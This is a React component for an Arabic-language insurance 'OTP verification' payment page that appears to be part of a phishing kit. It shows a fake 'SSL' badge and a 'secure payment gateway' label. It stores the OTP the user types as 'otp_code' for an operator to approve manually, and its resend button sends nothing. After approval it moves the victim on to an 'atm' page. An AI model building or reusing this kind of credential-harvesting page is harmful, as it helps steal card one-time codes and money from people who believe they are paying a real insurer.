import { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Shield, Lock, RefreshCw, Loader2, CreditCard } from "lucide-react";
import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";
import { useLanguage } from "@/i18n/LanguageContext";
import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";

const OTPVerification = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const o = t.otp;
  const offer = location.state?.offer;
  const passedOrderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id");
  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "••••";
  const totalPrice = offer?.totalPrice || offer?.price || 0;
  const companyName = offer?.company || "بي كير";

  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [waitingApproval, setWaitingApproval] = useState(false);
  const [orderId, setOrderId] = useState<string | null>(passedOrderId);
  const [timer, setTimer] = useState(120);
  const [canResend, setCanResend] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  const approvalStatus = useAdminApproval(orderId, "otp");

  useEffect(() => {
    inputRef.current?.focus();
  }, []);

  useEffect(() => {
    if (timer <= 0) {
      setCanResend(true);
      return;
    }

    const id = setInterval(() => setTimer((t) => t - 1), 1000);
    return () => clearInterval(id);
  }, [timer]);

  useEffect(() => {
    if (approvalStatus === "approved") {
      toast.success(o.verified);
      sessionStorage.setItem("insurance_order_id", orderId!);
      navigate("/insurance/atm", { state: { offer, orderId, cardLastFour } });
    } else if (approvalStatus === "rejected") {
      toast.error(o.rejected);
      setWaitingApproval(false);
      setLoading(false);
    }
  }, [approvalStatus, orderId, navigate, offer, cardLastFour, o.verified, o.rejected]);

  const handleVerify = async () => {
    if (otp.length < 4) return;

    setLoading(true);
    const id = await createOrUpdateStage(orderId, "otp", {
      otp_verified: false,
      otp_code: otp,
    });

    setOrderId(id);
    setWaitingApproval(true);
  };

  const handleResend = () => {
    setTimer(120);
    setCanResend(false);
    setOtp("");
    inputRef.current?.focus();
  };

  const fmtTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  return (
    <div className="relative min-h-[100dvh] overflow-hidden bg-gradient-to-b from-background via-secondary/20 to-background">
      <div className="absolute left-1/2 top-0 h-40 w-40 -translate-x-1/2 rounded-full bg-primary/10 blur-3xl" />
      <div className="absolute bottom-10 right-4 h-32 w-32 rounded-full bg-primary/5 blur-3xl" />

      <div className="container relative mx-auto px-3 md:px-4 pt-6 pb-24 md:pb-12">
        <div className="mx-auto max-w-md">
          <motion.div
            initial={{ opacity: 0, y: 24, scale: 0.98 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            transition={{ duration: 0.35, ease: "easeOut" }}
          >
            <div className="relative overflow-hidden rounded-[2rem] border border-border/60 bg-background/95 shadow-2xl backdrop-blur-sm">
              <div className="absolute inset-x-10 top-0 h-px bg-gradient-to-r from-transparent via-primary/60 to-transparent" />

              <div className="border-b border-border/60 bg-secondary/35 px-5 py-4 md:px-6">
                <div className="flex items-center justify-between gap-3">
                  <div className="flex items-center gap-2.5">
                    <div className="flex h-10 w-10 items-center justify-center rounded-2xl bg-primary/10 ring-1 ring-primary/15">
                      <CreditCard className="h-4 w-4 text-primary" />
                    </div>
                    <div>
                      <p className="text-sm font-bold text-foreground">{o.title}</p>
                      <p className="text-[11px] text-muted-foreground">بوابة دفع آمنة</p>
                    </div>
                  </div>

                  <div className="flex items-center gap-1.5 rounded-full border border-border/60 bg-background/80 px-2.5 py-1">
                    <Lock className="h-3 w-3 text-primary/70" />
                    <span className="text-[10px] font-medium text-muted-foreground">SSL</span>
                  </div>
                </div>
              </div>

              <div className="space-y-5 px-5 py-5 md:px-6">
                <div className="grid gap-3 rounded-2xl border border-border/60 bg-card/70 p-4">
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">التاجر</span>
                    <span className="font-semibold text-foreground">{companyName}</span>
                  </div>

                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">المبلغ</span>
                    <span className="text-sm font-bold text-foreground">{totalPrice.toLocaleString()} ر.س</span>
                  </div>

                  <div className="flex items-center justify-between text-xs">
                    <span className="text-muted-foreground">البطاقة</span>
                    <span className="font-mono font-semibold tracking-[0.2em] text-foreground" dir="ltr">
                      •••• {cardLastFour}
                    </span>
                  </div>
                </div>

                {waitingApproval ? (
                  <div className="space-y-4 rounded-2xl border border-border/60 bg-card/60 px-5 py-8 text-center">
                    <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-full bg-primary/10">
                      <Loader2 className="h-7 w-7 animate-spin text-primary" />
                    </div>
                    <div className="space-y-1.5">
                      <h3 className="text-sm font-bold text-foreground">{o.waitingApproval}</h3>
                      <p className="text-xs leading-6 text-muted-foreground">{o.waitingReview}</p>
                    </div>
                  </div>
                ) : (
                  <div className="space-y-4 rounded-2xl border border-border/60 bg-card/50 p-4 md:p-5">
                    <div className="space-y-1.5 text-right">
                      <label className="block text-xs font-medium text-foreground">{o.subtitle}</label>
                      <p className="text-[11px] leading-5 text-muted-foreground">تم إرسال رمز التحقق المكون من 6 أرقام إليك</p>
                    </div>

                    <div className="relative" dir="ltr">
                      <input
                        ref={inputRef}
                        type="text"
                        inputMode="numeric"
                        value={otp}
                        onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                        placeholder="••••••"
                        className="h-14 w-full rounded-2xl border-2 border-border bg-background px-4 text-center text-xl font-bold tracking-[0.55em] text-foreground transition-all placeholder:tracking-[0.3em] placeholder:text-muted-foreground/40 focus:border-primary focus:outline-none focus:ring-4 focus:ring-primary/10"
                      />
                    </div>

                    <div className="flex justify-center">
                      {canResend ? (
                        <button
                          onClick={handleResend}
                          className="flex items-center gap-1.5 rounded-full px-3 py-1.5 text-xs font-medium text-primary transition-colors hover:bg-primary/5 hover:text-primary"
                        >
                          <RefreshCw className="h-3.5 w-3.5" />
                          {o.resendCode}
                        </button>
                      ) : (
                        <div className="inline-flex items-center gap-1.5 rounded-full border border-border/60 bg-secondary/60 px-3 py-1.5">
                          <span className="text-[10px] text-muted-foreground">{o.resendIn}</span>
                          <span className="font-mono text-xs font-bold text-primary">{fmtTime(timer)}</span>
                        </div>
                      )}
                    </div>

                    {loading && (
                      <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        className="flex items-center justify-center gap-2 rounded-2xl bg-secondary/50 px-3 py-2"
                      >
                        <Loader2 className="h-4 w-4 animate-spin text-primary" />
                        <span className="text-xs text-muted-foreground">{o.verifying}</span>
                      </motion.div>
                    )}

                    <Button
                      onClick={handleVerify}
                      disabled={loading || otp.length < 4}
                      className="h-12 w-full rounded-2xl bg-cta text-sm font-bold text-cta-foreground shadow-sm transition-all hover:bg-cta-hover"
                    >
                      {loading ? (
                        <>
                          <Loader2 className="h-4 w-4 animate-spin" />
                          {o.verifying}
                        </>
                      ) : (
                        <>
                          <Lock className="h-4 w-4" />
                          {o.confirmPayment}
                        </>
                      )}
                    </Button>
                  </div>
                )}
              </div>

              <div className="border-t border-border/60 bg-secondary/25 px-5 py-3 md:px-6">
                <div className="flex items-center justify-center gap-2">
                  <Shield className="h-3.5 w-3.5 text-primary/70" />
                  <span className="text-[10px] text-muted-foreground">{o.secureProcess}</span>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default OTPVerification;
